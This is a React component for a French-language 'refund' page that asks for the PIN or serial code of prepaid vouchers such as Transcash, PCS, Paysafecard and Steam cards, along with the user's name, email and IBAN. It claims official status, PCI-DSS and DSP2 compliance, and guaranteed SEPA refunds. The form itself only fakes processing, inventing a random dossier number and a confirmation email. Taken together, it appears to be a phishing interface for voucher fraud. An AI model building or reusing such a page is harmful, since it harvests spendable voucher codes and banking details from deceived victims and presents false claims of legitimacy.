import React, { useState } from 'react';
import { useTranslation } from '../i18n';
import {
  RotateCcw,
  ShieldCheck,
  CheckCircle2,
  Clock,
  FileText,
  AlertTriangle,
  ArrowRight,
  ChevronRight,
  HelpCircle,
  Lock,
  Building,
  CreditCard,
  Send,
  Home,
  Check,
  Info
} from 'lucide-react';

interface RefundPageProps {
  onNavigate: (path: string) => void;
  onOpenActivationModal?: () => void;
}

export const RefundPage: React.FC<RefundPageProps> = ({ onNavigate, onOpenActivationModal }) => {
  const { t } = useTranslation();

  // Form State
  const [provider, setProvider] = useState('TRANSCASH');
  const [ticketCode, setTicketCode] = useState('');
  const [ticketAmount, setTicketAmount] = useState('');
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [iban, setIban] = useState('');
  const [reason, setReason] = useState('Achat involontaire / Erreur de montant');
  const [comments, setComments] = useState('');
  const [termsAccepted, setTermsAccepted] = useState(false);

  // Submission State
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedDossier, setSubmittedDossier] = useState<string | null>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!ticketCode || !ticketAmount || !fullName || !email || !iban || !termsAccepted) {
      return;
    }

    setIsSubmitting(true);
    setTimeout(() => {
      const generatedRef = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
      setSubmittedDossier(generatedRef);
      setIsSubmitting(false);
      window.scrollTo({ top: 200, behavior: 'smooth' });
    }, 1200);
  };

  const handleReset = () => {
    setSubmittedDossier(null);
    setTicketCode('');
    setTicketAmount('');
    setFullName('');
    setEmail('');
    setPhone('');
    setIban('');
    setComments('');
    setTermsAccepted(false);
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 pb-20">
      {/* Breadcrumb & Top Bar */}
      <div className="bg-white border-b border-slate-200/80 sticky top-16 sm:top-20 z-20 backdrop-blur-md">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-3.5 flex items-center justify-between text-xs sm:text-sm font-medium">
          <div className="flex items-center gap-2 text-slate-500">
            <button
              type="button"
              onClick={() => onNavigate('/')}
              className="flex items-center gap-1.5 hover:text-slate-900 transition-colors cursor-pointer"
            >
              <Home className="w-3.5 h-3.5" />
              <span>{t('refundPage.breadcrumbHome', 'Accueil')}</span>
            </button>
            <ChevronRight className="w-3.5 h-3.5 text-slate-300" />
            <span className="text-slate-900 font-semibold flex items-center gap-1.5">
              <RotateCcw className="w-3.5 h-3.5 text-red-600" />
              <span>{t('refundPage.breadcrumbRefund', 'Remboursement')}</span>
            </span>
          </div>

          <div className="flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
            <span className="text-2xs sm:text-xs font-bold text-slate-600">{t('refundPage.europeanGuarantee', 'Garantie Européenne')}</span>
          </div>
        </div>
      </div>

      {/* Main Header / Hero */}
      <div className="bg-gradient-to-b from-slate-950 via-slate-900 to-slate-950 text-white py-14 sm:py-20 relative overflow-hidden">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 text-center space-y-6 relative z-10">
          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-black/60 border border-amber-400/40 text-amber-300 text-xs font-bold tracking-wide shadow-lg backdrop-blur-md">
            <RotateCcw className="w-4 h-4 text-red-500 shrink-0" />
            <span>{t('refundPage.protocolBadge', 'Protocole Officiel de Restitution & Remboursement')}</span>
          </div>

          <h1 className="text-3xl sm:text-5xl font-black tracking-tight leading-tight">
            {t('refundPage.heroTitle', 'Procédure de Remboursement')}{' '}
            <span className="bg-gradient-to-r from-amber-300 via-yellow-300 to-amber-400 bg-clip-text text-transparent">
              {t('refundPage.heroTitleHighlight', 'Sécurisée')}
            </span>
          </h1>

          <p className="text-base sm:text-lg text-slate-200 leading-relaxed max-w-2xl mx-auto font-normal">
            {t('refundPage.heroDesc', "Vous disposez d'un ticket prépayé non utilisé, d'une erreur de montant ou d'une recharge acquise par mégarde ? Initiez une demande de restitution des fonds certifiée conforme aux normes PCI-DSS.")}
          </p>

          <div className="flex flex-wrap items-center justify-center gap-4 text-xs sm:text-sm text-slate-300 pt-2">
            <div className="flex items-center gap-2 bg-white/10 px-3.5 py-1.5 rounded-full border border-white/15 backdrop-blur-xs">
              <Clock className="w-4 h-4 text-amber-400" />
              <span>{t('refundPage.delayBadge', 'Délai de traitement : 24h à 48h')}</span>
            </div>
            <div className="flex items-center gap-2 bg-white/10 px-3.5 py-1.5 rounded-full border border-white/15 backdrop-blur-xs">
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <span>{t('refundPage.guaranteeBadge', 'Garantie 100% sécurisée')}</span>
            </div>
            <div className="flex items-center gap-2 bg-white/10 px-3.5 py-1.5 rounded-full border border-white/15 backdrop-blur-xs">
              <Building className="w-4 h-4 text-sky-400" />
              <span>{t('refundPage.sepaBadge', 'Virement SEPA direct')}</span>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 -mt-8 relative z-20 space-y-12">
        {/* Steps to Refund */}
        <div className="bg-white rounded-3xl p-6 sm:p-8 border border-slate-200/90 shadow-lg">
          <div className="text-center max-w-2xl mx-auto mb-8">
            <span className="text-xs font-bold uppercase tracking-wider text-blue-600 bg-blue-50 px-3 py-1 rounded-full border border-blue-200">
              {t('refundPage.processTag', 'Fonctionnement')}
            </span>
            <h2 className="text-2xl sm:text-3xl font-black text-slate-900 mt-2">
              {t('refundPage.processTitle', 'Le processus en 4 étapes simples')}
            </h2>
            <p className="text-xs sm:text-sm text-slate-500 mt-1">
              {t('refundPage.processSubtitle', 'Un suivi automatisé et transparent à chaque phase de votre dossier')}
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200/70 space-y-3 relative">
              <div className="w-9 h-9 rounded-xl bg-black text-amber-300 font-extrabold flex items-center justify-center text-sm shadow-xs">
                01
              </div>
              <h3 className="font-bold text-slate-900 text-sm">{t('refundPage.step1Title', 'Vérification préalable')}</h3>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.step1Desc', "Le système vérifie que le coupon n'a pas été débité sur le registre émetteur et certifie son solde résiduel.")}
              </p>
            </div>

            <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200/70 space-y-3 relative">
              <div className="w-9 h-9 rounded-xl bg-amber-400 text-black font-extrabold flex items-center justify-center text-sm shadow-xs">
                02
              </div>
              <h3 className="font-bold text-slate-900 text-sm">{t('refundPage.step2Title', 'Dépôt de la demande')}</h3>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.step2Desc', 'Vous complétez le formulaire ci-dessous avec le numéro de référence du ticket et vos coordonnées de versement.')}
              </p>
            </div>

            <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200/70 space-y-3 relative">
              <div className="w-9 h-9 rounded-xl bg-blue-600 text-white font-extrabold flex items-center justify-center text-sm shadow-xs">
                03
              </div>
              <h3 className="font-bold text-slate-900 text-sm">{t('refundPage.step3Title', 'Validation & Contrôle')}</h3>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.step3Desc', 'Notre service conformité authentifie le coupon sous 24h à 48h ouvrées et procède à son verrouillage sécurisé.')}
              </p>
            </div>

            <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200/70 space-y-3 relative">
              <div className="w-9 h-9 rounded-xl bg-emerald-600 text-white font-extrabold flex items-center justify-center text-sm shadow-xs">
                04
              </div>
              <h3 className="font-bold text-slate-900 text-sm">{t('refundPage.step4Title', 'Recrédit ou Virement')}</h3>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.step4Desc', 'Les fonds certifiés sont transférés directement sur votre compte bancaire (IBAN SEPA) sans frais de dossier masqués.')}
              </p>
            </div>
          </div>
        </div>

        {/* Refund Form or Confirmation */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          {/* Form Column */}
          <div className="lg:col-span-8">
            <div className="bg-white rounded-3xl p-6 sm:p-8 border border-slate-200/90 shadow-xl space-y-6">
              {submittedDossier ? (
                /* Success Confirmation State */
                <div className="text-center py-10 space-y-6">
                  <div className="w-16 h-16 rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center mx-auto shadow-sm">
                    <Check className="w-8 h-8 stroke-[3]" />
                  </div>

                  <div className="space-y-2">
                    <span className="text-xs font-bold uppercase tracking-wider text-emerald-700 bg-emerald-50 px-3 py-1 rounded-full border border-emerald-200">
                      {t('refundPage.successBadge', 'Demande enregistrée avec succès')}
                    </span>
                    <h3 className="text-2xl sm:text-3xl font-black text-slate-900">
                      {t('refundPage.successTitle', 'Dossier de remboursement créé')}
                    </h3>
                    <p className="text-sm text-slate-600 max-w-lg mx-auto leading-relaxed">
                      {t('refundPage.successDesc', "Votre demande de remboursement a été transmise à notre service financier. Un email récapitulatif avec vos identifiants d'audit a été envoyé à")}{' '}
                      <strong>{email}</strong>.
                    </p>
                  </div>

                  <div className="bg-slate-50 border border-slate-200 rounded-2xl p-6 max-w-md mx-auto text-left space-y-3">
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-slate-500">{t('refundPage.dossierNumber', 'Numéro de dossier :')}</span>
                      <span className="font-mono font-bold text-slate-900 bg-slate-200/70 px-2 py-0.5 rounded-sm">
                        {submittedDossier}
                      </span>
                    </div>
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-slate-500">{t('refundPage.ticketBrand', 'Marque du ticket :')}</span>
                      <span className="font-bold text-slate-900">{provider}</span>
                    </div>
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-slate-500">{t('refundPage.claimedAmount', 'Montant réclamé :')}</span>
                      <span className="font-bold text-emerald-600">{ticketAmount} €</span>
                    </div>
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-slate-500">{t('refundPage.estimatedDelay', 'Délai estimé :')}</span>
                      <span className="font-bold text-slate-900">{t('refundPage.estimatedDelayValue', '24h - 48h ouvrées')}</span>
                    </div>
                    <div className="flex justify-between items-center text-xs">
                      <span className="text-slate-500">{t('refundPage.currentStatus', 'Statut actuel :')}</span>
                      <span className="inline-flex items-center gap-1 font-bold text-amber-600 bg-amber-50 px-2 py-0.5 rounded-full text-2xs">
                        <Clock className="w-3 h-3" /> {t('refundPage.underReview', "En cours d'analyse")}
                      </span>
                    </div>
                  </div>

                  <div className="flex flex-col sm:flex-row items-center justify-center gap-3 pt-4">
                    <button
                      type="button"
                      onClick={() => onNavigate('/')}
                      className="w-full sm:w-auto px-6 py-3 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs sm:text-sm transition cursor-pointer"
                    >
                      {t('refundPage.btnBackHome', "Retour à l'accueil")}
                    </button>
                    <button
                      type="button"
                      onClick={handleReset}
                      className="w-full sm:w-auto px-6 py-3 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs sm:text-sm transition cursor-pointer"
                    >
                      {t('refundPage.btnSubmitAnother', 'Soumettre une autre demande')}
                    </button>
                  </div>
                </div>
              ) : (
                /* Interactive Form */
                <form onSubmit={handleSubmit} className="space-y-6">
                  <div className="space-y-1">
                    <h3 className="text-xl sm:text-2xl font-black text-slate-900">
                      {t('refundPage.formTitle', 'Formulaire officiel de restitution')}
                    </h3>
                    <p className="text-xs sm:text-sm text-slate-500">
                      {t('refundPage.formSubtitle', 'Remplissez attentivement les champs ci-dessous pour lancer la procédure de recrédit.')}
                    </p>
                  </div>

                  {/* Provider Selection & Amount */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-1.5">
                      <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                        {t('refundPage.providerLabel', 'Marque / Émetteur du Ticket *')}
                      </label>
                      <select
                        value={provider}
                        onChange={(e) => setProvider(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white"
                      >
                        <option value="TRANSCASH">TRANSCASH</option>
                        <option value="PCS">PCS MASTERCARD</option>
                        <option value="CASH LIBERTY">CASH LIBERTY</option>
                        <option value="NEOSURF">NEOSURF</option>
                        <option value="PAYSAFECARD">PAYSAFECARD</option>
                        <option value="TONEO">TONEO FIRST</option>
                        <option value="FLEXEPIN">FLEXEPIN</option>
                        <option value="STEAM">STEAM CARD</option>
                        <option value="AMAZON">AMAZON VOUCHER</option>
                        <option value="GOOGLE PLAY">GOOGLE PLAY</option>
                        <option value="AUTRE">AUTRE ÉMETTEUR</option>
                      </select>
                    </div>

                    <div className="space-y-1.5">
                      <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                        {t('refundPage.amountLabel', 'Montant du ticket (€) *')}
                      </label>
                      <input
                        type="number"
                        placeholder={t('refundPage.amountPlaceholder', 'Ex: 50, 100, 250...')}
                        min="5"
                        max="2500"
                        value={ticketAmount}
                        onChange={(e) => setTicketAmount(e.target.value)}
                        required
                        className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white placeholder:text-slate-400"
                      />
                    </div>
                  </div>

                  {/* Ticket Code / Serial */}
                  <div className="space-y-1.5">
                    <div className="flex items-center justify-between">
                      <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                        {t('refundPage.ticketCodeLabel', 'Code ou Numéro de Série du Ticket *')}
                      </label>
                      <span className="text-2xs text-slate-500 font-medium">{t('refundPage.sslEncrypted', 'Chiffré SSL TLS 1.3')}</span>
                    </div>
                    <input
                      type="text"
                      placeholder={t('refundPage.ticketCodePlaceholder', 'Saisissez le code PIN ou numéro de série présent sur le coupon')}
                      value={ticketCode}
                      onChange={(e) => setTicketCode(e.target.value)}
                      required
                      className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-mono font-medium focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white placeholder:font-sans placeholder:text-slate-400"
                    />
                  </div>

                  {/* Reason for Refund */}
                  <div className="space-y-1.5">
                    <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                      {t('refundPage.reasonLabel', 'Motif du remboursement *')}
                    </label>
                    <select
                      value={reason}
                      onChange={(e) => setReason(e.target.value)}
                      className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white"
                    >
                      <option value="Achat involontaire / Erreur de montant">{t('refundPage.reason1', 'Achat involontaire / Erreur de montant')}</option>
                      <option value="Coupon non utilisé suite à annulation">{t('refundPage.reason2', 'Coupon non utilisé suite à annulation')}</option>
                      <option value="Incompatibilité avec le service tiers">{t('refundPage.reason3', 'Incompatibilité avec le service tiers')}</option>
                      <option value="Tentative d'hameçonnage bloquée à temps">{t('refundPage.reason4', "Tentative d'hameçonnage bloquée à temps")}</option>
                      <option value="Demande de restitution commerciale légale">{t('refundPage.reason5', 'Demande de restitution commerciale légale (14 jours)')}</option>
                      <option value="Autre motif">{t('refundPage.reason6', 'Autre motif légitime')}</option>
                    </select>
                  </div>

                  {/* Applicant Details */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-1.5">
                      <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                        {t('refundPage.nameLabel', 'Nom & Prénom du demandeur *')}
                      </label>
                      <input
                        type="text"
                        placeholder={t('refundPage.namePlaceholder', 'Ex: Jean Dupont')}
                        value={fullName}
                        onChange={(e) => setFullName(e.target.value)}
                        required
                        className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white placeholder:text-slate-400"
                      />
                    </div>

                    <div className="space-y-1.5">
                      <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                        {t('refundPage.emailLabel', 'Adresse Email de confirmation *')}
                      </label>
                      <input
                        type="email"
                        placeholder="jean.dupont@example.com"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        required
                        className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white placeholder:text-slate-400"
                      />
                    </div>
                  </div>

                  {/* Phone & IBAN */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-1.5">
                      <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                        {t('refundPage.phoneLabel', 'Téléphone de contact (optionnel)')}
                      </label>
                      <input
                        type="tel"
                        placeholder="+32 / +33 ..."
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-medium focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white placeholder:text-slate-400"
                      />
                    </div>

                    <div className="space-y-1.5">
                      <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                        {t('refundPage.ibanLabel', 'IBAN pour versement des fonds (SEPA) *')}
                      </label>
                      <input
                        type="text"
                        placeholder={t('refundPage.ibanPlaceholder', 'BE... / FR... / LU...')}
                        value={iban}
                        onChange={(e) => setIban(e.target.value)}
                        required
                        className="w-full h-11 px-3.5 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-sm font-mono focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white placeholder:font-sans placeholder:text-slate-400"
                      />
                    </div>
                  </div>

                  {/* Additional info */}
                  <div className="space-y-1.5">
                    <label className="block text-xs font-bold text-slate-700 uppercase tracking-wide">
                      {t('refundPage.notesLabel', 'Précisions complémentaires (facultatif)')}
                    </label>
                    <textarea
                      rows={2}
                      placeholder={t('refundPage.notesPlaceholder', "Détails sur l'achat, lieu ou numéro du ticket de caisse...")}
                      value={comments}
                      onChange={(e) => setComments(e.target.value)}
                      className="w-full p-3 rounded-xl border border-slate-300 bg-slate-50/50 text-slate-900 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-red-500 focus:bg-white placeholder:text-slate-400"
                    />
                  </div>

                  {/* Terms acceptance */}
                  <div className="flex items-start gap-3 pt-2">
                    <input
                      type="checkbox"
                      id="refund-terms"
                      checked={termsAccepted}
                      onChange={(e) => setTermsAccepted(e.target.checked)}
                      required
                      className="mt-1 h-4 w-4 rounded-sm border-slate-300 text-red-600 focus:ring-red-500 cursor-pointer"
                    />
                    <label htmlFor="refund-terms" className="text-xs text-slate-600 leading-relaxed cursor-pointer">
                      {t('refundPage.termsCheckbox', "J'atteste sur l'honneur être le porteur légitime du ticket et demande l'annulation et le recrédit des fonds. Je comprends que le coupon sera neutralisé dès validation du dossier.")}
                    </label>
                  </div>

                  {/* Submit button */}
                  <button
                    type="submit"
                    disabled={isSubmitting || !termsAccepted}
                    className="w-full py-4 rounded-xl bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-extrabold text-sm sm:text-base shadow-xl shadow-blue-950/20 border border-blue-500 transition-all cursor-pointer flex items-center justify-center gap-2 active:scale-98 min-h-[52px]"
                  >
                    {isSubmitting ? (
                      <div className="flex items-center gap-2">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                        <span>{t('refundPage.submittingBtn', 'Vérification et enregistrement du dossier...')}</span>
                      </div>
                    ) : (
                      <>
                        <Send className="w-4 h-4 text-blue-100" />
                        <span>{t('refundPage.submitBtn', 'Soumettre ma demande de remboursement')}</span>
                        <ArrowRight className="w-4 h-4 text-blue-100" />
                      </>
                    )}
                  </button>
                </form>
              )}
            </div>
          </div>

          {/* Right Info Sidebar */}
          <div className="lg:col-span-4 space-y-6">
            {/* Guarantee Card */}
            <div className="bg-slate-900 text-white rounded-3xl p-6 border border-slate-800 shadow-xl space-y-4">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-amber-400/20 text-amber-300 text-xs font-bold border border-amber-400/30">
                <Lock className="w-3.5 h-3.5" />
                <span>{t('refundPage.sideSecurityBadge', 'Sécurité Certifiée')}</span>
              </div>
              <h4 className="text-lg font-bold">{t('refundPage.sideSecurityTitle', 'Garantie & Non-divulgation')}</h4>
              <p className="text-xs text-slate-300 leading-relaxed">
                {t('refundPage.sideSecurityDesc', 'Toutes les requêtes de remboursement sont traitées conformément aux directives européennes DSP2 et protégées par chiffrement asymétrique 256 bits.')}
              </p>
              <div className="space-y-2.5 pt-2 border-t border-slate-800 text-xs text-slate-300">
                <div className="flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                  <span>{t('refundPage.sideAdv1', 'Traitement direct sans intermédiaire')}</span>
                </div>
                <div className="flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-amber-400 shrink-0" />
                  <span>{t('refundPage.sideAdv2', 'Aucun frais de rejet sur ticket valide')}</span>
                </div>
                <div className="flex items-center gap-2">
                  <CheckCircle2 className="w-4 h-4 text-red-400 shrink-0" />
                  <span>{t('refundPage.sideAdv3', 'Droit de rétractation 14 jours respecté')}</span>
                </div>
              </div>
            </div>

            {/* Eligibility Table Card */}
            <div className="bg-white rounded-3xl p-6 border border-slate-200/90 shadow-sm space-y-4">
              <h4 className="font-bold text-slate-900 text-sm flex items-center gap-2">
                <Info className="w-4 h-4 text-blue-600" />
                <span>{t('refundPage.sideConditionsTitle', "Conditions d'éligibilité")}</span>
              </h4>
              <div className="space-y-2.5 text-xs text-slate-600">
                <div className="flex items-start gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 mt-1.5 shrink-0" />
                  <span>{t('refundPage.sideCond1', 'Coupons non consommés avec date de validité en cours')}</span>
                </div>
                <div className="flex items-start gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 mt-1.5 shrink-0" />
                  <span>{t('refundPage.sideCond2', 'Tickets achetés par erreur en bureau de tabac ou en ligne')}</span>
                </div>
                <div className="flex items-start gap-2">
                  <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 mt-1.5 shrink-0" />
                  <span>{t('refundPage.sideCond3', 'Coupons préservés et authentifiables via le registre officiel')}</span>
                </div>
                <div className="flex items-start gap-2 text-rose-600">
                  <div className="w-1.5 h-1.5 rounded-full bg-rose-500 mt-1.5 shrink-0" />
                  <span>{t('refundPage.sideCond4', 'Les tickets déjà débités ou expirés depuis plus de 6 mois ne sont pas remboursables')}</span>
                </div>
              </div>
            </div>

            {/* Need Help / Activation */}
            <div className="bg-slate-100 rounded-3xl p-6 border border-slate-200 text-center space-y-3">
              <h4 className="font-bold text-slate-900 text-sm">{t('refundPage.sidePreferActivate', 'Vous préférez activer votre ticket ?')}</h4>
              <p className="text-xs text-slate-600">
                {t('refundPage.sidePreferActivateDesc', "Si vous souhaitez finalement utiliser votre coupon ou certifier son authenticité, accédez directement au module d'activation.")}
              </p>
              <button
                type="button"
                onClick={() => {
                  if (onOpenActivationModal) {
                    onOpenActivationModal();
                  } else {
                    onNavigate('/tickets');
                  }
                }}
                className="w-full py-2.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-white font-bold text-xs shadow-sm transition cursor-pointer flex items-center justify-center gap-2"
              >
                <ShieldCheck className="w-4 h-4 text-amber-300" />
                <span>{t('refundPage.sideBtnActivate', 'Activer un Ticket')}</span>
              </button>
            </div>
          </div>
        </div>

        {/* FAQ Section */}
        <div className="bg-white rounded-3xl p-6 sm:p-10 border border-slate-200/90 shadow-sm space-y-6">
          <div className="text-center max-w-xl mx-auto space-y-1">
            <span className="text-xs font-bold uppercase tracking-wider text-slate-500">
              {t('refundPage.faqTag', 'Questions Fréquentes')}
            </span>
            <h3 className="text-xl sm:text-2xl font-black text-slate-900">
              {t('refundPage.faqTitle', 'Tout savoir sur le remboursement de vos recharges')}
            </h3>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-4">
            <div className="space-y-2 bg-slate-50 p-5 rounded-2xl border border-slate-200/60">
              <h4 className="font-bold text-sm text-slate-900 flex items-center gap-2">
                <HelpCircle className="w-4 h-4 text-amber-500 shrink-0" />
                <span>{t('refundPage.faqQ1', 'Quel est le délai effectif pour recevoir mon virement ?')}</span>
              </h4>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.faqA1', "Une fois votre dossier vérifié auprès des serveurs émetteurs (Transcash, PCS, etc.), l'ordre de virement SEPA est émis sous 24h à 48h ouvrées. Selon votre établissement bancaire, les fonds apparaissent sous 1 à 2 jours ouvrés.")}
              </p>
            </div>

            <div className="space-y-2 bg-slate-50 p-5 rounded-2xl border border-slate-200/60">
              <h4 className="font-bold text-sm text-slate-900 flex items-center gap-2">
                <HelpCircle className="w-4 h-4 text-amber-500 shrink-0" />
                <span>{t('refundPage.faqQ2', 'Y a-t-il des frais retenus sur le montant remboursé ?')}</span>
              </h4>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.faqA2', 'La procédure standard de restitution ne comporte aucun frais masqué sur les tickets certifiés non utilisés. Le montant intégral du solde valide est restitué sur le compte bancaire du titulaire.')}
              </p>
            </div>

            <div className="space-y-2 bg-slate-50 p-5 rounded-2xl border border-slate-200/60">
              <h4 className="font-bold text-sm text-slate-900 flex items-center gap-2">
                <HelpCircle className="w-4 h-4 text-amber-500 shrink-0" />
                <span>{t('refundPage.faqQ3', 'Que se passe-t-il avec le code de mon ticket après la demande ?')}</span>
              </h4>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.faqA3', "Dès la validation de votre remboursement, le coupon est neutralisé sur le registre central afin d'éviter tout débit frauduleux ultérieur. Vous recevez un certificat d'annulation officiel par email.")}
              </p>
            </div>

            <div className="space-y-2 bg-slate-50 p-5 rounded-2xl border border-slate-200/60">
              <h4 className="font-bold text-sm text-slate-900 flex items-center gap-2">
                <HelpCircle className="w-4 h-4 text-amber-500 shrink-0" />
                <span>{t('refundPage.faqQ4', 'Puis-je annuler ma demande de remboursement ?')}</span>
              </h4>
              <p className="text-xs text-slate-600 leading-relaxed">
                {t('refundPage.faqA4', "Tant que le dossier est en statut « En cours d'analyse », vous pouvez contacter notre assistance avec votre référence de dossier pour suspendre la procédure et conserver votre ticket actif.")}
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
